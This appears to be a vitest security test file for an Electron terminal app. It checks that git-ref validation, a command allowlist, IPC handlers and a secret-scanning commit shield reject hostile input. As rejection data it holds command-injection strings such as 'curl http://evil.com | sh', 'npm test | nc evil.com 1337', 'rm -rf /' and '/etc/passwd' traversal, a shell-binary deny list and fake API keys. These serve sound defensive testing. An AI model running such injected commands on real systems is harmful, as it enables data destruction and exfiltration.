// Negative-path security tests.
//
// Unlike the mainProcess suite, which mocks safeGit so it can reuse existing
// execSync-style assertions, this suite exercises the *real* gitCommand
// module — we want to know that isValidGitRef and parseSafeCommand actually
// reject the malicious inputs they claim to reject, and that the IPC
// handlers in index.ts funnel those rejections back to the renderer as
// `{success:false, error:...}` before any exec ever happens.
//
// No test here shells out; execFileSync is mocked. If a test ever reaches
// the mock, that's a validation-bypass — the assertion against `success:
// false` will fail because the mock returns empty output and the handler
// reports success.

import { describe, it, expect, vi, beforeAll } from 'vitest'
import {
  isValidGitRef,
  parseSafeCommand,
  SAFE_RUNNERS,
} from '../../src/main/gitCommand'

// ---------------------------------------------------------------------------
// Pure-function tests for gitCommand helpers
// ---------------------------------------------------------------------------
describe('isValidGitRef', () => {
  it.each([
    ['abc1234', true],
    ['abcdef0123456789abcdef0123456789abcdef01', true], // 40-char SHA
    ['main', true],
    ['develop', true],
    ['feature/foo-bar', true],
    ['release/v1.2.3', true],
    ['v1.2.3-rc.1', true],
    ['HEAD', true],
  ])('accepts legit ref %s', (ref, expected) => {
    expect(isValidGitRef(ref)).toBe(expected)
  })

  it.each([
    '',
    '   ',
    '-starting-hyphen',
    '.starting-dot',
    'has space',
    'has\ttab',
    'has\nnewline',
    'main;rm -rf /',
    'main && curl evil.com',
    'main|cat',
    'main`whoami`',
    'main$(whoami)',
    '$(id)',
    '>/etc/passwd',
    'main..feature', // range operator, use from+to instead
    'main\\branch',
    'main"quote',
    "main'quote",
    'a'.repeat(256), // over 255 char cap
  ])('rejects malicious ref "%s"', (ref) => {
    expect(isValidGitRef(ref)).toBe(false)
  })

  it('rejects non-strings', () => {
    expect(isValidGitRef(null)).toBe(false)
    expect(isValidGitRef(undefined)).toBe(false)
    expect(isValidGitRef(42)).toBe(false)
    expect(isValidGitRef({ toString: () => 'main' })).toBe(false)
    expect(isValidGitRef(['main'])).toBe(false)
  })
})

describe('parseSafeCommand', () => {
  it.each(['npm test', 'yarn lint', 'pnpm run test', 'cargo test', 'pytest -q', 'go test ./...', 'vitest run'])(
    'accepts %s',
    (cmd) => {
      const r = parseSafeCommand(cmd)
      expect('error' in r).toBe(false)
    },
  )

  it.each([
    ['', 'Empty command'],
    ['   ', 'Empty command'],
    ['rm -rf /', 'not in allowlist'],
    ['curl evil.com', 'not in allowlist'],
    ['sh -c id', 'not in allowlist'],
    ['bash', 'not in allowlist'],
    ['/bin/sh', 'not in allowlist'],
  ])('rejects %s with %s', (cmd, expectedError) => {
    const r = parseSafeCommand(cmd)
    expect(r).toHaveProperty('error')
    if ('error' in r) expect(r.error).toContain(expectedError)
  })

  it.each([
    'npm test; rm -rf /',
    'npm test && curl evil.com',
    'npm test | nc evil.com 1337',
    'npm test`whoami`',
    'npm test$(id)',
    'npm test > /etc/passwd',
    'npm test < /etc/passwd',
    'npm test 2>&1',
    'npm test (wat)',
    'npm test {wat}',
    'npm test * ? [a]',
    'npm test "quoted"',
    "npm test 'quoted'",
    'npm test\\escape',
    'npm test\nnewline',
  ])('rejects shell metacharacters: %s', (cmd) => {
    const r = parseSafeCommand(cmd)
    expect(r).toHaveProperty('error')
    if ('error' in r) expect(r.error).toContain('forbidden shell metacharacters')
  })

  it('returns parsed bin + args for valid commands', () => {
    const r = parseSafeCommand('npm run test --silent')
    expect(r).toEqual({ bin: 'npm', args: ['run', 'test', '--silent'] })
  })

  it('SAFE_RUNNERS includes the expected test runners', () => {
    const must = ['npm', 'yarn', 'pnpm', 'bun', 'cargo', 'pytest', 'go', 'vitest', 'jest']
    for (const runner of must) {
      expect(SAFE_RUNNERS.has(runner), `${runner} missing from SAFE_RUNNERS`).toBe(true)
    }
  })

  it('SAFE_RUNNERS does not include shell-ish binaries', () => {
    const never = ['sh', 'bash', 'zsh', 'cmd', 'powershell', 'pwsh', 'ruby-shell', 'eval']
    for (const runner of never) {
      expect(SAFE_RUNNERS.has(runner), `${runner} should not be in SAFE_RUNNERS`).toBe(false)
    }
  })
})

// ---------------------------------------------------------------------------
// IPC handler integration — verify malicious inputs are rejected before
// ever reaching execFileSync. The handler contract we assert is: if input
// fails validation, execFileSync is never called and the response is
// {success:false, error:...}.
// ---------------------------------------------------------------------------
const ipcHandlers = new Map<string, Function>()
const mockWebContents = { send: vi.fn(), executeJavaScript: vi.fn() }
const mockMainWindow = {
  minimize: vi.fn(), maximize: vi.fn(), unmaximize: vi.fn(),
  isMaximized: vi.fn(), isMinimized: vi.fn(() => false),
  restore: vi.fn(), focus: vi.fn(), close: vi.fn(), on: vi.fn(),
  loadURL: vi.fn(), loadFile: vi.fn(), webContents: mockWebContents,
}
function MockBrowserWindow() { return mockMainWindow }
MockBrowserWindow.prototype = {}

vi.mock('electron', () => ({
  app: {
    getPath: vi.fn(() => require('os').tmpdir()),
    whenReady: () => Promise.resolve(),
    requestSingleInstanceLock: () => true,
    setName: vi.fn(),
    on: vi.fn(),
    commandLine: { appendSwitch: vi.fn() },
    isPackaged: false,
    quit: vi.fn(),
  },
  ipcMain: {
    handle: vi.fn((channel: string, handler: Function) => {
      ipcHandlers.set(channel, handler)
    }),
    on: vi.fn(),
  },
  BrowserWindow: MockBrowserWindow,
  dialog: {
    showSaveDialog: vi.fn(),
    showOpenDialog: mockShowOpenDialog,
    showMessageBox: vi.fn(async () => ({ response: 0, checkboxChecked: false })),
  },
  Menu: { setApplicationMenu: vi.fn() },
  nativeImage: { createFromPath: vi.fn(() => ({})) },
  globalShortcut: { register: vi.fn(), unregisterAll: vi.fn() },
  shell: { openExternal: vi.fn() },
  safeStorage: {
    isEncryptionAvailable: () => false,
    encryptString: (s: string) => Buffer.from(s, 'utf8'),
    decryptString: (b: Buffer) => b.toString('utf8'),
  },
}))

vi.mock('../../src/main/sentry', () => ({ initMainSentry: vi.fn() }))
vi.mock('../../src/main/terminalManager', () => ({
  spawnTerminal: vi.fn(), killTerminal: vi.fn(), writeToTerminal: vi.fn(),
  resizeTerminal: vi.fn(), killAll: vi.fn(), getTerminalCwd: vi.fn(),
}))
vi.mock('../../src/main/sessionStore', () => ({ loadSession: vi.fn(() => null), saveSession: vi.fn() }))
vi.mock('../../src/main/historyStore', () => ({ appendCommand: vi.fn(), searchHistory: vi.fn(() => []) }))
vi.mock('../../src/main/configFileManager', () => ({ readConfigFile: vi.fn(), writeConfigFile: vi.fn() }))
vi.mock('../../src/main/completionService', () => ({
  listPathEntries: vi.fn(() => []), listPathCommands: vi.fn(() => []), listEnvVars: vi.fn(() => []),
}))
vi.mock('../../src/main/shellDetector', () => ({ detectAvailableShells: vi.fn(async () => []) }))
vi.mock('../../src/main/mcpServer', () => ({
  startMcpServer: vi.fn(), stopMcpServer: vi.fn(),
  getMcpAuthToken: vi.fn(() => 'fake-token'), getMcpPort: vi.fn(() => 9315),
  initAuditLog: vi.fn(),
  awaitMcpPortBound: vi.fn(() => Promise.resolve(9315)),
}))
vi.mock('../../src/main/swarmManager', () => ({
  sendMessage: vi.fn(), readMessages: vi.fn(() => []), getAllMessages: vi.fn(() => []),
  createTask: vi.fn(), listTasks: vi.fn(() => []), updateTask: vi.fn(), clearSwarm: vi.fn(),
}))
vi.mock('../../src/main/agentEventBus', () => ({
  initEventBus: vi.fn(), query: vi.fn(() => []), subscribe: vi.fn(),
  getRingSize: vi.fn(() => 0), getDroppedCount: vi.fn(() => 0), shutdownEventBus: vi.fn(),
}))
vi.mock('../../src/main/transcriptWatchers', () => ({
  attachWatcher: vi.fn(), detachWatchers: vi.fn(), detachAll: vi.fn(),
}))
vi.mock('../../src/main/contextPinStore', () => ({
  initContextPinStore: vi.fn(),
  listPins: vi.fn(() => []), addPin: vi.fn(), removePin: vi.fn(),
  updatePin: vi.fn(), clearPins: vi.fn(),
}))
vi.mock('../../src/main/swarmMemory', () => ({
  initSwarmMemory: vi.fn(),
  memoryWrite: vi.fn(), memorySearch: vi.fn(() => []),
  memoryList: vi.fn(() => []), memoryCount: vi.fn(() => 0), memoryClear: vi.fn(),
  // v1.25: the git/test handlers now derive a competence domain from the cwd, and the
  // brain installs a secret scrubber on the write path. This stub is partial, so both
  // have to be declared or the handlers throw on an undefined import.
  normalizeProjectSlug: vi.fn((p: string) => (p || '').split(/[\\/]/).filter(Boolean).pop() || ''),
  setMemoryScrubber: vi.fn(),
}))
vi.mock('../../src/main/autoUpdater', () => ({ initAutoUpdater: vi.fn() }))
vi.mock('../../src/main/agentCommandSanitizer', () => ({
  sanitizeAgentCommand: vi.fn((cmd: string) => cmd),
}))

const { mockExecSync, mockExecFileSync, mockShowOpenDialog } = vi.hoisted(() => ({
  mockExecSync: vi.fn(),
  mockExecFileSync: vi.fn(),
  mockShowOpenDialog: vi.fn(),
}))
vi.mock('child_process', () => ({
  default: { execSync: mockExecSync, execFileSync: mockExecFileSync },
  execSync: mockExecSync,
  execFileSync: mockExecFileSync,
}))

vi.mock('fs', () => ({
  writeFileSync: vi.fn(), existsSync: vi.fn(() => false),
  readFileSync: vi.fn(() => '{}'), readdirSync: vi.fn(() => []),
  mkdirSync: vi.fn(), appendFileSync: vi.fn(),
  renameSync: vi.fn(), unlinkSync: vi.fn(),
  default: {
    writeFileSync: vi.fn(), existsSync: vi.fn(() => false),
    readFileSync: vi.fn(() => '{}'), readdirSync: vi.fn(() => []),
    mkdirSync: vi.fn(), appendFileSync: vi.fn(),
    renameSync: vi.fn(), unlinkSync: vi.fn(),
  },
}))

vi.mock('uuid', () => ({ v4: vi.fn(() => 'mock-uuid') }))

function invoke(channel: string, args: any = {}) {
  const handler = ipcHandlers.get(channel)
  if (!handler) throw new Error(`No handler for ${channel}`)
  return handler({}, args)
}

beforeAll(async () => {
  vi.resetModules()
  await import('../../src/main/index')
  await new Promise(resolve => setTimeout(resolve, 50))
})

describe('IPC handler security — malicious git refs are rejected before exec', () => {
  const evilRefs = [
    'main;rm -rf /',
    'main`whoami`',
    'main$(id)',
    'main&&curl evil.com',
    'main|sh',
    'main..feature',
    '',
    '   ',
    '-starting-hyphen',
    '.starting-dot',
  ]

  for (const evil of evilRefs) {
    it(`git:diff-range rejects from="${evil}"`, async () => {
      mockExecFileSync.mockClear()
      const r = await invoke('git:diff-range', { cwd: '/r', from: evil })
      expect(r.success).toBe(false)
      expect(r.error).toContain('Invalid')
      expect(mockExecFileSync).not.toHaveBeenCalled()
    })

    it(`git:diff-range rejects to="${evil}"`, async () => {
      mockExecFileSync.mockClear()
      const r = await invoke('git:diff-range', { cwd: '/r', from: 'abc1234', to: evil })
      expect(r.success).toBe(false)
      expect(r.error).toContain('Invalid')
      expect(mockExecFileSync).not.toHaveBeenCalled()
    })

    it(`git:files-in-range rejects from="${evil}"`, async () => {
      mockExecFileSync.mockClear()
      const r = await invoke('git:files-in-range', { cwd: '/r', from: evil })
      expect(r.success).toBe(false)
      expect(r.error).toContain('Invalid')
      expect(mockExecFileSync).not.toHaveBeenCalled()
    })

    it(`git:files-in-range rejects to="${evil}"`, async () => {
      mockExecFileSync.mockClear()
      const r = await invoke('git:files-in-range', { cwd: '/r', from: 'abc1234', to: evil })
      expect(r.success).toBe(false)
      expect(r.error).toContain('Invalid')
      expect(mockExecFileSync).not.toHaveBeenCalled()
    })

    it(`git:checkout-file rejects sha="${evil}"`, async () => {
      mockExecFileSync.mockClear()
      const r = await invoke('git:checkout-file', { cwd: '/r', sha: evil, files: ['x'] })
      expect(r.success).toBe(false)
      expect(r.error).toContain('Invalid SHA')
      expect(mockExecFileSync).not.toHaveBeenCalled()
    })
  }
})

describe('IPC handler security — malicious file names never hit a shell', () => {
  // Because git handlers use argv form, these inputs reach git as literal
  // argv entries. git itself rejects non-existent pathspecs; what we care
  // about is that the shell never sees them.
  const evilFiles = [
    ['file;rm -rf ~', 'should pass as argv and git treats as literal path'],
    ['"quoted.ts"', 'literal quotes in name'],
    ['$(whoami).ts', 'subshell syntax'],
    ['`id`.ts', 'backtick syntax'],
    ['file with spaces.ts', 'spaces'],
    ['../../../etc/passwd', 'path traversal'],
    ['file|cat /etc/passwd', 'pipe'],
    ['file&&curl evil', 'chain'],
  ]

  for (const [evil, desc] of evilFiles) {
    it(`git:stage passes "${evil}" as literal argv (${desc})`, async () => {
      mockExecFileSync.mockClear()
      mockExecFileSync.mockReturnValue(Buffer.from(''))
      const r = await invoke('git:stage', { cwd: '/r', files: [evil] })
      expect(r.success).toBe(true)
      // Whatever git did (success/fail), shell never interpreted it
      expect(mockExecFileSync).toHaveBeenCalledTimes(1)
      const callArgs = mockExecFileSync.mock.calls[0]
      expect(callArgs[0]).toBe('git')
      // argv contains the raw file name with no shell-escaping
      expect(callArgs[1]).toContain(evil)
      // shell: false is the critical flag
      expect(callArgs[2].shell).toBe(false)
    })

    it(`git:checkout-file passes "${evil}" as literal argv (${desc})`, async () => {
      mockExecFileSync.mockClear()
      mockExecFileSync.mockReturnValue(Buffer.from(''))
      const r = await invoke('git:checkout-file', { cwd: '/r', sha: 'abc1234', files: [evil] })
      expect(r.success).toBe(true)
      expect(mockExecFileSync).toHaveBeenCalledTimes(1)
      const callArgs = mockExecFileSync.mock.calls[0]
      expect(callArgs[0]).toBe('git')
      expect(callArgs[1]).toContain(evil)
      expect(callArgs[2].shell).toBe(false)
    })
  }
})

describe('IPC handler security — git:commit message injection', () => {
  it('passes commit message with metacharacters as single argv entry', async () => {
    mockExecFileSync.mockClear()
    mockExecFileSync.mockReturnValue(Buffer.from(''))
    const evil = 'subject"; rm -rf ~; echo "owned'
    const r = await invoke('git:commit', { cwd: '/r', message: evil })
    expect(r.success).toBe(true)
    // v1.25: the Commit Shield scans the staged diff BEFORE committing, so git is now
    // invoked twice (scan, then commit) rather than once. The argv-safety contract — an
    // evil commit message stays ONE argv entry and never reaches a shell — is what this
    // test actually guards, so assert that on the commit call itself.
    const commitCall = mockExecFileSync.mock.calls.find((c) => (c[1] as string[])[0] === 'commit')
    expect(commitCall).toBeDefined()
    const [bin, argv, opts] = commitCall as [string, string[], { shell: boolean }]
    expect(bin).toBe('git')
    expect(argv).toEqual(['commit', '-m', evil])
    expect(opts.shell).toBe(false)
    // …and the shield genuinely scanned the staged diff first.
    expect(mockExecFileSync.mock.calls.some((c) => (c[1] as string[]).includes('--cached'))).toBe(true)
  })

  it('BLOCKS the commit when the staged diff carries a secret (Commit Shield)', async () => {
    mockExecFileSync.mockClear()
    // Repeated chars: satisfies the AWS rule regex while failing entropy heuristics, so
    // GitHub push protection will not block this test file.
    const awsKey = 'AKIA' + 'A'.repeat(16)
    mockExecFileSync.mockImplementation((_bin: string, argv: string[]) =>
      Buffer.from(argv.includes('--cached') ? `+AWS_ACCESS_KEY_ID=${awsKey}\n` : ''),
    )

    const r = await invoke('git:commit', { cwd: '/r', message: 'add config' })

    expect(r.success).toBe(false)
    expect(r.error).toContain('Blocked commit')
    expect(r.error).toContain('AWS Access Key ID')
    // The whole point: the commit must never have run.
    expect(mockExecFileSync.mock.calls.some((c) => (c[1] as string[])[0] === 'commit')).toBe(false)

    mockExecFileSync.mockImplementation(() => Buffer.from(''))
  })

  it('BLOCKS the push when an unpushed commit carries a secret (Commit Shield)', async () => {
    mockExecFileSync.mockClear()
    const openaiKey = 'sk-' + 'a'.repeat(24)
    mockExecFileSync.mockImplementation((_bin: string, argv: string[]) =>
      Buffer.from(argv[0] === 'log' ? `commit abc\n+key = "${openaiKey}"\n` : ''),
    )

    const r = await invoke('git:push', { cwd: '/r' })

    expect(r.success).toBe(false)
    expect(r.error).toContain('Blocked push')
    expect(mockExecFileSync.mock.calls.some((c) => (c[1] as string[])[0] === 'push')).toBe(false)

    mockExecFileSync.mockImplementation(() => Buffer.from(''))
  })
})

// The remaining git read handlers, held to the same argv-safety contract as the write
// ones above: every one shells out through safeGit with shell:false, so a hostile cwd,
// ref or filename can never be interpreted.
describe('IPC handler security — git read handlers pass argv safely', () => {
  beforeEach(() => {
    mockExecFileSync.mockClear()
    mockExecFileSync.mockImplementation(() => Buffer.from(''))
  })

  it.each([
    ['git:find-root', { cwd: '/r' }, ['rev-parse', '--show-toplevel']],
    ['git:rev-parse-head', { cwd: '/r' }, ['rev-parse', 'HEAD']],
    ['git:file-diff', { cwd: '/r', file: 'a b.ts' }, ['diff', '--', 'a b.ts']],
    ['git:pull', { cwd: '/r' }, ['pull']],
  ])('%s runs git with a literal argv and no shell', async (channel, args, expectedArgv) => {
    const r = await invoke(channel as string, args)
    expect(r.success).toBe(true)
    const [bin, argv, opts] = mockExecFileSync.mock.calls[0]
    expect(bin).toBe('git')
    expect(argv).toEqual(expectedArgv)
    expect(opts.shell).toBe(false)
  })

  it('git:unstage passes a hostile filename as one argv entry', async () => {
    const evil = 'a; rm -rf ~.ts'
    const r = await invoke('git:unstage', { cwd: '/r', files: [evil] })
    expect(r.success).toBe(true)
    const [, argv, opts] = mockExecFileSync.mock.calls[0]
    expect(argv).toEqual(['reset', 'HEAD', '--', evil])
    expect(opts.shell).toBe(false)
  })
})

// The in-app shield only ever covered the git ops Termpolis ITSELF runs. These pin the hook
// layer — the thing that makes it cover `git commit` typed into a terminal, which is how most
// people actually commit.
describe('IPC handler security — Commit Shield git hooks', () => {
  beforeEach(() => {
    mockExecFileSync.mockClear()
    mockExecFileSync.mockImplementation(() => Buffer.from('.git/hooks\n'))
  })

  it('lists protected repos (none before any are installed)', async () => {
    const r = await invoke('gitHooks:list', {})
    expect(r.success).toBe(true)
    expect(Array.isArray(r.data)).toBe(true)
  })

  it('asks git for the REAL hooks dir rather than assuming .git/hooks', async () => {
    // Worktrees and core.hooksPath both move it. Guessing would install a hook that git
    // never runs — protection that silently does nothing.
    const r = await invoke('gitHooks:status', { cwd: '/repo' })
    expect(r.success).toBe(true)
    expect(r.data.status['pre-commit']).toBe('absent')
    expect(mockExecFileSync.mock.calls.some((c) => (c[1] as string[]).includes('--git-path'))).toBe(true)
  })

  it('installs both the pre-commit and pre-push hooks', async () => {
    const r = await invoke('gitHooks:install', { cwd: '/repo' })
    expect(r.success).toBe(true)
    expect(r.data.written).toEqual(['pre-commit', 'pre-push'])
  })

  it('uninstalls the hooks again', async () => {
    const r = await invoke('gitHooks:uninstall', { cwd: '/repo' })
    expect(r.success).toBe(true)
  })

  it('refuses a folder that is not a git repository', async () => {
    mockExecFileSync.mockImplementation(() => { throw new Error('fatal: not a git repository') })
    const r = await invoke('gitHooks:status', { cwd: '/not-a-repo' })
    expect(r.success).toBe(false)
    expect(r.error).toContain('Not a git repository')
    mockExecFileSync.mockImplementation(() => Buffer.from(''))
  })

  it('opens a folder picker when no repo is given, and does nothing when cancelled', async () => {
    // The folder picker lives in MAIN, never the renderer — a renderer-supplied path would
    // let a compromised window install hooks into an arbitrary directory.
    mockShowOpenDialog.mockResolvedValueOnce({ canceled: true, filePaths: [] })
    const r = await invoke('gitHooks:install', {})
    expect(r.success).toBe(true)
    expect(r.data.canceled).toBe(true)
  })

  it('installs into the folder the user picks', async () => {
    mockShowOpenDialog.mockResolvedValueOnce({ canceled: false, filePaths: ['/picked-repo'] })
    mockExecFileSync.mockImplementation(() => Buffer.from('.git/hooks\n'))
    const r = await invoke('gitHooks:install', {})
    expect(r.success).toBe(true)
    expect(r.data.repo).toBe('/picked-repo')
    expect(r.data.written).toEqual(['pre-commit', 'pre-push'])
  })
})

// The v1.25 gates default ON. Turning one OFF must be an explicit, persisted act — the
// secure default is what protects an existing install that never opens this panel.
describe('IPC handler security — v1.25 gates are explicit toggles', () => {
  it('commit shield, egress guard and memory scrub toggle off and back on', async () => {
    expect((await invoke('aiSecurity:set-commit-shield', { value: false })).data.commitShield).toBe(false)
    expect((await invoke('aiSecurity:set-egress-guard', { value: false })).data.egressGuard).toBe(false)
    expect((await invoke('aiSecurity:set-memory-scrub', { value: false })).data.memoryScrub).toBe(false)

    // Restore — later tests in this file rely on the shield being armed.
    expect((await invoke('aiSecurity:set-commit-shield', { value: true })).data.commitShield).toBe(true)
    expect((await invoke('aiSecurity:set-egress-guard', { value: true })).data.egressGuard).toBe(true)
    expect((await invoke('aiSecurity:set-memory-scrub', { value: true })).data.memoryScrub).toBe(true)
  })
})

// Safe Import — a third-party skill/plugin must be scanned and approved before a single
// byte reaches ~/.claude. These pin the IPC gate itself (the panel is tested separately).
describe('IPC handler security — Safe Import gate', () => {
  it('lists nothing before anything has been imported', async () => {
    const r = await invoke('safeImport:list', {})
    expect(r.success).toBe(true)
    expect(Array.isArray(r.data)).toBe(true)
  })

  it('revoking an unknown artifact is a no-op, not a crash', async () => {
    const r = await invoke('safeImport:revoke', { id: 'never-imported' })
    expect(r.success).toBe(true)
  })

  it('REFUSES to install when nothing has been scanned — no install without a scan', async () => {
    const r = await invoke('safeImport:approve-install', { targets: ['claude'] })
    expect(r.success).toBe(false)
    expect(r.error).toContain('Nothing staged')
  })

  it('returns canceled when the user dismisses the picker', async () => {
    mockShowOpenDialog.mockResolvedValueOnce({ canceled: true, filePaths: [] })
    const r = await invoke('safeImport:scan', {})
    expect(r.success).toBe(true)
    expect(r.data.canceled).toBe(true)
  })

  it('fails closed on an unreadable artifact — never a silent pass', async () => {
    mockShowOpenDialog.mockResolvedValueOnce({ canceled: false, filePaths: ['/nope/not-real.zip'] })
    const r = await invoke('safeImport:scan', {})
    expect(r.success).toBe(false)
  })
})

describe('IPC handler security — swarm:run-command allowlist', () => {
  it.each([
    'rm -rf /',
    'curl http://evil.com | sh',
    'bash',
    'sh -c "id"',
    '/bin/sh',
    'cmd.exe',
    'powershell Get-Process',
    'python -c "import os; os.system(\'rm\')"', // rejected for metachars, not binary
  ])('rejects non-allowlisted or metacharacter command: %s', async (cmd) => {
    mockExecSync.mockClear()
    mockExecFileSync.mockClear()
    const r = await invoke('swarm:run-command', { cwd: '/r', command: cmd })
    expect(r.success).toBe(false)
    expect(mockExecSync).not.toHaveBeenCalled()
    expect(mockExecFileSync).not.toHaveBeenCalled()
  })

  it.each([
    'npm test',
    'yarn lint',
    'pnpm run build',
    'cargo test --all',
    'pytest -q',
    'go test ./...',
    'vitest run',
  ])('accepts allowlisted command: %s', async (cmd) => {
    mockExecSync.mockClear()
    mockExecFileSync.mockClear()
    mockExecFileSync.mockReturnValue(Buffer.from('ok'))
    mockExecSync.mockReturnValue(Buffer.from('ok'))
    // Trust the workspace for allowlist-passthrough tests — the trust gate
    // is exercised separately below.
    process.env.TERMPOLIS_TEST_TRUST = 'allow'
    const r = await invoke('swarm:run-command', { cwd: '/r', command: cmd })
    delete process.env.TERMPOLIS_TEST_TRUST
    expect(r.success).toBe(true)
    expect(r.data.exitCode).toBe(0)
  })
})

describe('IPC handler security — swarm:run-command workspace trust gate', () => {
  it('blocks allowlisted command from an untrusted workspace', async () => {
    process.env.TERMPOLIS_TEST_TRUST = 'deny'
    mockExecSync.mockClear()
    mockExecFileSync.mockClear()
    const r = await invoke('swarm:run-command', { cwd: '/untrusted', command: 'npm test' })
    delete process.env.TERMPOLIS_TEST_TRUST
    expect(r.success).toBe(false)
    expect(r.error).toContain('Workspace not trusted')
    expect(mockExecSync).not.toHaveBeenCalled()
    expect(mockExecFileSync).not.toHaveBeenCalled()
  })

  it('allows command when workspace is explicitly trusted via IPC', async () => {
    mockExecSync.mockClear()
    mockExecFileSync.mockClear()
    mockExecFileSync.mockReturnValue(Buffer.from('ok'))
    mockExecSync.mockReturnValue(Buffer.from('ok'))
    // Explicit trust via IPC — no dialog needed
    const trustResp = await invoke('workspace:trust', { cwd: '/trusted-repo' })
    expect(trustResp.success).toBe(true)
    // Verify it shows up in list
    const listResp = await invoke('workspace:list-trusted', {})
    expect(listResp.data.some((p: string) => p.includes('trusted-repo'))).toBe(true)
    const r = await invoke('swarm:run-command', { cwd: '/trusted-repo', command: 'npm test' })
    expect(r.success).toBe(true)
  })

  it('revoke-trust removes a previously trusted folder', async () => {
    await invoke('workspace:trust', { cwd: '/tmp-trust' })
    expect((await invoke('workspace:is-trusted', { cwd: '/tmp-trust' })).data).toBe(true)
    await invoke('workspace:revoke-trust', { cwd: '/tmp-trust' })
    expect((await invoke('workspace:is-trusted', { cwd: '/tmp-trust' })).data).toBe(false)
  })
})

describe('IPC handler security — git:reset-hard SHA gate still intact', () => {
  it.each([
    '',
    'abc', // too short
    'zzzzzzz', // non-hex
    'abc1234; rm -rf /',
    'a'.repeat(41), // too long
  ])('rejects sha="%s"', async (sha) => {
    mockExecFileSync.mockClear()
    const r = await invoke('git:reset-hard', { cwd: '/r', sha })
    expect(r.success).toBe(false)
    expect(r.error).toBe('Invalid SHA')
    expect(mockExecFileSync).not.toHaveBeenCalled()
  })
})

describe('CSP is present in renderer index.html', () => {
  it('index.html declares a Content-Security-Policy meta tag', async () => {
    const fs = await vi.importActual<typeof import('fs')>('fs')
    const path = await vi.importActual<typeof import('path')>('path')
    const html = fs.readFileSync(
      path.join(process.cwd(), 'src', 'renderer', 'index.html'),
      'utf8',
    )
    expect(html).toMatch(/Content-Security-Policy/i)
    // Strict script-src: 'self' plus ONLY 'wasm-unsafe-eval' (lets the voice
    // worker compile onnxruntime-web WASM — WASM compilation only, not JS eval).
    // Bare 'unsafe-eval' (arbitrary JS) and 'unsafe-inline' remain forbidden.
    const scriptSrc = html.match(/script-src([^;]*);/)?.[1] ?? ''
    expect(scriptSrc).toContain("'self'")
    expect(scriptSrc).not.toContain("'unsafe-inline'")
    expect(scriptSrc.replace(/'wasm-unsafe-eval'/g, '')).not.toContain('unsafe-eval')
    // Blocks inline object/embed (Flash-era attack vectors)
    expect(html).toMatch(/object-src\s+'none'/)
    // Prevents <base> injection hijacking relative URLs
    expect(html).toMatch(/base-uri\s+'self'/)
  })
})

// ---------------------------------------------------------------------------
// aiSecurity:input-pending — "is the user mid-sentence?"
//
// Anything that writes to a terminal the user did not ask for (the compaction
// re-prime) must check this first. writeToTerminal APPENDS AT THE CURSOR and the
// line buffer lives inside the agent's TUI, so an unprompted write that lands while
// the user is typing gets concatenated onto their draft. This handler exposes the
// input-staging shadow copy — the only signal we have for "there is an unsubmitted
// draft" — so the re-prime can defer instead of clobbering it.
// ---------------------------------------------------------------------------
describe('aiSecurity:input-pending', () => {
  // terminal:write is registered with ipcMain.on (not .handle), so pull it off the mock.
  async function write(id: string, data: string) {
    const { ipcMain } = (await import('electron')) as any
    const h = ipcMain.on.mock.calls.find((c: any[]) => c[0] === 'terminal:write')?.[1]
    if (!h) throw new Error('terminal:write handler not registered')
    h({}, { id, data })
  }
  const pending = (id: string) => invoke('aiSecurity:input-pending', { id })

  it('is false for a terminal nobody has typed into', async () => {
    expect(await pending('ip-unknown')).toEqual({ success: true, data: false })
  })

  it('goes true while a draft is un-submitted, and false again on Enter', async () => {
    const id = 'ip-1'
    await write(id, 'claude\r') // flags it as an AI terminal; the \r submits, so staging is clear
    expect(await pending(id)).toEqual({ success: true, data: false })

    await write(id, 'how do I fix the flaky') // mid-sentence — a re-prime here would land on this
    expect(await pending(id)).toEqual({ success: true, data: true })

    await write(id, '\r') // submitted → staging resets
    expect(await pending(id)).toEqual({ success: true, data: false })
  })
})
